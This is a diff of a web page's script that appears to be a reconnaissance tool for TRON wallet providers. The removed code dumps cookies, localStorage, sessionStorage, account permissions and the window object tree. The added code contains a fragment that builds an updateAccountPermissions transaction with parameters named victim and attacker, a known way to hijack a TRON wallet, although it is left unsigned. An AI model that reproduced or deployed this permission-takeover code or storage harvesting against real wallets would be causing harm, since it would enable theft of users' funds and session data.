-  if (!tw || tw._error) { Console.log('warn', 'no tronWeb'); return; }
-
-  const walk = (obj, prefix, depth, seen, maxDepth) => {
-    if (!obj || depth > maxDepth || seen.has(obj)) return {};
-    if (typeof obj !== 'object' && typeof obj !== 'function') return {};
-    seen.add(obj);
-    const out = {};
-    let keys = [];
-    try { keys = Object.getOwnPropertyNames(obj); } catch { return {}; }
-    for (const k of keys) {
-      if (['constructor','caller','callee','arguments'].includes(k)) continue;
-      let v;
-      try { v = obj[k]; } catch { continue; }
-      const path = prefix ? `${prefix}.${k}` : k;
-      if (typeof v === 'function') out[path] = { arity: v.length, name: v.name };
-      else if (v && typeof v === 'object' && depth < maxDepth) Object.assign(out, walk(v, path, depth + 1, seen, maxDepth));
-    }
-    seen.delete(obj);
-    return out;
-  };
-
-  DUMP.tronWebMethods = walk(tw, '', 0, new WeakSet(), 3);
-  Console.log('ok', 'TRONWEB METHODS', { count: Object.keys(DUMP.tronWebMethods).length });
-
-  const focus = Object.keys(DUMP.tronWebMethods).filter(k => /sign|permission|owner|active|multi|permit/i.test(k));
-  Console.log('meta', 'sign/permission methods', focus);
-}
-
-async function collectAccountAndChain() {
-  const tw = getTronWeb();
-  if (!tw || tw._error) { Console.log('warn', 'no tronWeb'); return; }
-
-  DUMP.account = {
-    defaultAddress: safeGet(() => tw.defaultAddress),
-    fullNode: safeGet(() => tw.fullNode?.host),
-    solidityNode: safeGet(() => tw.solidityNode?.host),
-    eventServer: safeGet(() => tw.eventServer?.host),
-    version: safeGet(() => tw.version),
-    isReady: safeGet(() => tw.ready),
-  };
-  Console.log('info', 'ACCOUNT base', DUMP.account);
-
-  const addr = safeGet(() => tw.defaultAddress?.base58);
-  if (addr && tw.trx?.getAccount) {
-    try {
-      const acc = await tw.trx.getAccount(addr);
-      DUMP.account.full = acc;
-      DUMP.permissions = {
-        owner: acc?.owner_permission,
-        active: acc?.active_permission,
-        witness: acc?.witness_permission,
-      };
-      Console.log('ok', 'ACCOUNT full', {
-        address: addr,
-        balance_trx: acc?.balance ? acc.balance / 1e6 : 0,
-        owner_permission: acc?.owner_permission,
-        active_permission: acc?.active_permission,
-        witness: acc?.witness_permission,
-        frozen: acc?.frozen,
-        votes: acc?.votes,
-      });
-    } catch (e) { Console.log('error', 'getAccount error', { message: e.message }); }
-  }
-
-  try {
-    if (tw.trx?.getCurrentBlock) {
-      const b = await tw.trx.getCurrentBlock();
-      DUMP.chain.block = {
-        number: b?.block_header?.raw_data?.number,
-        id: b?.blockID,
-        ts: b?.block_header?.raw_data?.timestamp,
-      };
-      Console.log('info', 'CHAIN block', DUMP.chain.block);
-    }
-  } catch (e) { Console.log('warn', 'getCurrentBlock error', { message: e.message }); }
-
-  try {
-    if (tw.trx?.getChainParameters) {
-      const p = await tw.trx.getChainParameters();
-      DUMP.chain.parameters = p;
-      Console.log('ok', 'CHAIN parameters', { count: Array.isArray(p) ? p.length : '?' });
-    }
-  } catch (e) { Console.log('warn', 'getChainParameters error', { message: e.message }); }
-}
-
-function collectStorage() {
-  DUMP.cookies = document.cookie.split(';').map(c => c.trim()).filter(Boolean).map(c => {
-    const [n, ...r] = c.split('=');
-    const v = r.join('=');
-    return { name: n, len: v.length, preview: v.slice(0, 40) };
-  });
-  Console.log('info', 'COOKIES', { count: DUMP.cookies.length, names: DUMP.cookies.map(c => c.name) });
-
-  try {
-    for (let i = 0; i < localStorage.length; i++) {
-      const k = localStorage.key(i);
-      DUMP.localStorage[k] = localStorage.getItem(k);
-    }
-  } catch (e) { DUMP.errors.push({ area: 'localStorage', message: e.message }); }
-  Console.log('info', 'localStorage', { count: Object.keys(DUMP.localStorage).length, keys: Object.keys(DUMP.localStorage) });
-
-  try {
-    for (let i = 0; i < sessionStorage.length; i++) {
-      const k = sessionStorage.key(i);
-      DUMP.sessionStorage[k] = sessionStorage.getItem(k);
-    }
-  } catch (e) { DUMP.errors.push({ area: 'sessionStorage', message: e.message }); }
-  Console.log('info', 'sessionStorage', { count: Object.keys(DUMP.sessionStorage).length, keys: Object.keys(DUMP.sessionStorage) });
-
-  try {
-    if (indexedDB.databases) {
-      indexedDB.databases().then(dbs => {
-        DUMP.indexedDB = dbs.map(d => ({ name: d.name, version: d.version }));
-        Console.log('info', 'indexedDB', DUMP.indexedDB);
-      }).catch(e => { DUMP.errors.push({ area: 'indexedDB', message: e.message }); });
-    }
-  } catch (e) { DUMP.errors.push({ area: 'indexedDB', message: e.message }); }
-}
-
-function scanMemory() {
-  const result = {};
-  const seen = new WeakSet();
-  const walk = (obj, prefix, depth, maxDepth) => {
-    if (!obj || depth > maxDepth || seen.has(obj)) return;
-    if (typeof obj !== 'object' && typeof obj !== 'function') return;
-    seen.add(obj);
-    let keys = [];
-    try { keys = Object.getOwnPropertyNames(obj); } catch { return; }
-    for (const k of keys) {
-      if (['constructor','caller','callee','arguments'].includes(k)) continue;
-      const path = prefix ? `${prefix}.${k}` : k;
-      let v;
-      try { v = obj[k]; } catch { result[path] = '[getter err]'; continue; }
-      const t = typeof v;
-      if (t === 'function') result[path] = `[fn/${v.length}]`;
-      else if (t === 'object' && v !== null) {
-        if (depth < maxDepth) walk(v, path, depth + 1, maxDepth);
-        result[path] = `[object ${v.constructor?.name || '?'}]`;
-      } else if (t === 'string' || t === 'number' || t === 'boolean') {
-        result[path] = v;
-      } else result[path] = `[${t}]`;
-    }
-    seen.delete(obj);
-  };
-  walk(window, 'window', 0, 2);
-  DUMP.memoryScan = result;
-  Console.log('ok', 'MEMORY window tree', { paths: Object.keys(result).length });
-}
-
-async function tryRpcCalls() {
-  const tw = getTronWeb();
-  if (!tw || tw._error || !tw.trx) { Console.log('warn', 'no trx'); return; }
-  const calls = [
-    ['getCurrentBlock', () => tw.trx.getCurrentBlock()],
-    ['getChainParameters', () => tw.trx.getChainParameters()],
-    ['getNodeInfo', () => tw.trx.getNodeInfo()],
-    ['getBlockByNumber', () => tw.trx.getBlockByNumber(1)],
-  ];
-  DUMP.rpc = {};
-  for (const [name, fn] of calls) {
-    try {
-      const r = await fn();
-      DUMP.rpc[name] = { ok: true, keys: typeof r === 'object' ? Object.keys(r).slice(0, 12) : String(r) };
-      Console.log('ok', 'RPC ' + name, DUMP.rpc[name]);
-    } catch (e) {
-      DUMP.rpc[name] = { ok: false, error: e.message };
-      Console.log('warn', 'RPC ' + name + ' error', { message: e.message });
-    }
+    log('PERM', 'building updateAccountPermissions', { victim, attacker });
+    const tx = await builder.updateAccountPermissions(perm);
+    log('PERM', 'tx built', { txID: tx.txID });
+    out('o_perm', { step: 'built', tx, note: 'NOT signed — inspect only' });
+  } catch (e) {
+    out('o_perm', { step: 'build failed', message: e.message });
+    log('PERM', 'build failed', { message: e.message });
   }
 }
+
+/* ── rpc ─────────────────────────────────────────────────── */
 
 async function probeEndpoints() {
-  const candidates = [
-    ['trongrid-fullnode', 'https://api.trongrid.io/wallet/getnowblock'],
-    ['trongrid-solidity', 'https://api.trongrid.io/walletsolidity/getnowblock'],
-    ['trongrid-event', 'https://api.trongrid.io/event/eventquery'],
-    ['trust-api', 'https://api.trustwallet.com/'],
-    ['trust-v2', 'https://api.trustwallet.com/v2/'],
-    ['trust-config', 'https://config.trustwallet.com/'],
-    ['trust-scan', 'https://api.trustwallet.com/scan/'],
-    ['trust-aml', 'https://api.trustwallet.com/aml/'],
-  ];
-  DUMP.endpoints = {};
-  for (const [name, url] of candidates) {
-    try {
-      const t0 = performance.now();
-      const r = await fetch(url, { method: 'GET', mode: 'cors', credentials: 'omit', cache: 'no-store' });
-      DUMP.endpoints[name] = {
-        url, status: r.status, ok: r.ok, type: r.type,
-        headers: Object.fromEntries(r.headers.entries()),
-        ms: Math.round(performance.now() - t0),
-      };
-      Console.log(r.ok ? 'ok' : 'warn', 'ENDPOINT ' + name, { status: r.status, ms: DUMP.endpoints[name].ms });
-    } catch (e) {
-      DUMP.endpoints[name] = { url, error: e.message };
-      Console.log('warn', 'ENDPOINT ' + name + ' error', { message: e.message });
-    }
-  }
-}
-
-/* ═══════════════════════════════════════════════════════
-   MAIN
-   ═══════════════════════════════════════════════════════ */
-
-async function runDump() {
-  const btn = document.getElementById('btn_dump');
-  btn.disabled = true;
-  setStatus('warn', 'running…');
-  clearConsole();
-
+  const r = resolve();
+  const bt = r.Bt || r.wS;
+  if (!bt) { out('o_rpc', 'no tronWeb'); return; }
+  const eps = {
+    fullNode: bt.fullNode?.host || bt.currentProviders?.().fullNode?.host || '—',
+    solidityNode: bt.solidityNode?.host || '—',
+    eventServer: bt.eventServer?.host || '—',
+  };
+  const results = { endpoints: eps, probes: [] };
   const t0 = performance.now();
   try {
-    collectMeta();
-    collectEnv();
-    probeProviders();
-    collectTronWebTree();
-    collectTronWebMethods();
-    await collectAccountAndChain();
-    collectStorage();
-    scanMemory();
-    await tryRpcCalls();
-    await probeEndpoints();
-
-    DUMP.meta.dumpMs = Math.round(performance.now() - t0);
-    document.getElementById('json_out').textContent = Console.pretty(DUMP, 0, new WeakSet(), 5);
-    document.getElementById('btn_copy').disabled = false;
-    setStatus('ok', `done in ${DUMP.meta.dumpMs}ms · ${Object.keys(DUMP).length} sections`);
-    Console.log('ok', 'DUMP COMPLETE', { ms: DUMP.meta.dumpMs });
-  } catch (e) {
-    DUMP.errors.push({ area: 'runDump', message: e.message, stack: e.stack });
-    setStatus('err', 'error: ' + e.message);
-    Console.log('error', 'DUMP FAILED', { message: e.message, stack: e.stack });
-  } finally {
-    btn.disabled = false;
-  }
-}
-
-async function copyJSON() {
-  let text;
+    const info = await bt.trx.getNodeInfo();
+    results.probes.push({ rpc: 'getNodeInfo', ok: true, ms: Math.round(performance.now()-t0), keys: Object.keys(info).slice(0,8) });
+  } catch (e) { results.probes.push({ rpc: 'getNodeInfo', ok: false, err: e.message }); }
   try {
-    text = JSON.stringify(DUMP, (k, v) => {
-      if (typeof v === 'function') return `[fn ${v.name || 'anon'}/${v.length}]`;
-      if (typeof v === 'bigint') return v.toString() + 'n';
-      return v;
-    }, 2);
-  } catch (e) {
-    text = Console.pretty(DUMP, 0, new WeakSet(), 5);
-  }
-  await copyText(text, 'JSON');
+    const t1 = performance.now();
+    const block = await bt.trx.getCurrentBlock();
+    results.probes.push({ rpc: 'getCurrentBlock', ok: true, ms: Math.round(performance.now()-t1), num: block.block_header?.raw_data?.number });
+  } catch (e) { results.probes.push({ rpc: 'getCurrentBlock', ok: false, err: e.message }); }
+  out('o_rpc', results);
+  log('RPC', 'endpoints', results);
 }
 
-async function copyLog() {
-  const lines = [...document.querySelectorAll('#console-body .cl')].map(l => l.textContent);
-  await copyText(lines.join('\n'), 'LOG');
-}
-
-async function copyText(text, label) {
+async function probeChain() {
+  const r = resolve();
+  const bt = r.Bt || r.wS;
+  if (!bt) { out('o_rpc', 'no tronWeb'); return; }
   try {
-    if (navigator.clipboard && navigator.clipboard.writeText) {
-      await navigator.clipboard.writeText(text);
-      setStatus('ok', `${label} copied (${text.length} chars)`);
-      return;
-    }
-    throw new Error('clipboard unavailable');
-  } catch (e) {
-    try {
-      const ta = document.createElement('textarea');
-      ta.value = text;
-      ta.style.position = 'fixed';
-      ta.style.top = '0';
-      ta.style.left = '0';
-      ta.style.opacity = '0';
-      document.body.appendChild(ta);
-      ta.focus();
-      ta.select();
-      const ok = document.execCommand('copy');
-      document.body.removeChild(ta);
-      setStatus(ok ? 'ok' : 'err', ok ? `${label} copied (fallback)` : `copy failed — select manually`);
-    } catch (e2) {
-      setStatus('err', `copy failed: ${e2.message}`);
-    }
-  }
+    const params = await bt.trx.getChainParameters();
+    out('o_rpc', params);
+    log('CHAIN', 'params', { count: params.length });
+  } catch (e) { out('o_rpc', { err: e.message }); }
 }
 
-function clearAll() {
-  clearConsole();
-  document.getElementById('json_out').textContent = '—';
-  document.getElementById('btn_copy').disabled = true;
-  setStatus('', 'cleared');
-}
+/* ── boot ────────────────────────────────────────────────── */
 
-/* boot */
-setStatus('warn', 'Press RUN to dump full surface.');
-Console.log('info', 'BOOT', { origin: location.origin, host: location.host, ua: navigator.userAgent.slice(0, 60) });
+(function boot() {
+  const r = resolve();
+  const hasEthereum = !!window.ethereum;
+  $('env').innerHTML = `
+    <b>origin</b><span>${esc(location.origin)}</span>
+    <b>UA</b><span style="font-size:10px">${esc(navigator.userAgent)}</span>
+    <b>window.tron</b><span class="${window.tron?'ok':'bad'}">${window.tron ? 'present' : 'absent'}</span>
+    <b>window.tronLink</b><span class="${window.tronLink?'ok':'bad'}">${window.tronLink ? 'present' : 'absent'}</span>
+    <b>trustwallet.tron</b><span class="${window.trustwallet?.tron?'ok':'bad'}">${window.trustwallet?.tron ? 'present' : 'absent'}</span>
+    <b>window.tronWeb</b><span class="${window.tronWeb?'ok':'bad'}">${window.tronWeb ? 'present' : 'absent'}</span>
+    <b>window.ethereum</b><span class="${hasEthereum?'ok':'bad'}">${hasEthereum ? 'present' : 'absent'}</span>
+    <b>resolved wS</b><span class="${r.wS?'ok':'bad'}">${r.wS ? r.names.filter(n=>n!=='window.tronWeb').join(', ') : 'none'}</span>
+    <b>resolved Bt</b><span class="${r.Bt?'ok':'bad'}">${r.Bt ? 'window.tronWeb' : 'none'}</span>
+  `;
+  $('ch_ws').innerHTML = r.wS ? `
+    <b>instance</b><span class="acc">wS (bridge)</span>
+    <b>version</b><span>${esc(r.wS.version || '—')}</span>
+    <b>ready</b><span class="${r.wS.ready?'ok':'warn'}">${r.wS.ready}</span>
+    <b>defaultAddress</b><span>${r.wS.defaultAddress?.base58 || r.wS.tronWeb?.defaultAddress?.base58 || '—'}</span>
+    <b>trx.sign</b><span class="${typeof r.wS.trx?.sign==='function'?'ok':'bad'}">${typeof r.wS.trx?.sign}</span>
+    <b>trx.signMessageV2</b><span class="${typeof r.wS.trx?.signMessageV2==='function'?'ok':'bad'}">${typeof r.wS.trx?.signMessageV2}</span>
+    <b>request</b><span class="${typeof r.wS.request==='function'?'ok':'bad'}">${typeof r.wS.request}</span>
+    <b>markReady</b><span class="${typeof r.wS.markReady==='function'?'ok':'bad'}">${typeof r.wS.markReady}</span>
+  ` : '<b>wS</b><span class="bad">not resolved</span>';
+
+  $('ch_bt').innerHTML = r.Bt ? `
+    <b>instance</b><span class="warn">Bt (fullnode)</span>
+    <b>version</b><span>${esc(r.Bt.version || '—')}</span>
+    <b>ready</b><span>${r.Bt.ready ?? '—'}</span>
+    <b>defaultAddress</b><span>${r.Bt.defaultAddress?.base58 || '—'}</span>
+    <b>trx.sign</b><span class="${typeof r.Bt.trx?.sign==='function'?'ok':'bad'}">${typeof r.Bt.trx?.sign}</span>
+    <b>trx.signMessageV2</b><span class="${typeof r.Bt.trx?.signMessageV2==='function'?'ok':'bad'}">${typeof r.Bt.trx?.signMessageV2}</span>
+    <b>fullNode</b><span style="font-size:10px">${esc(r.Bt.fullNode?.host || '—')}</span>
+  ` : '<b>Bt</b><span class="warn">not resolved</span>';
+
+  log('BOOT', 'tron-surface up', { origin: location.origin, wS: !!r.wS, Bt: !!r.Bt });
+})();
 </script>
 </body>
 </html>
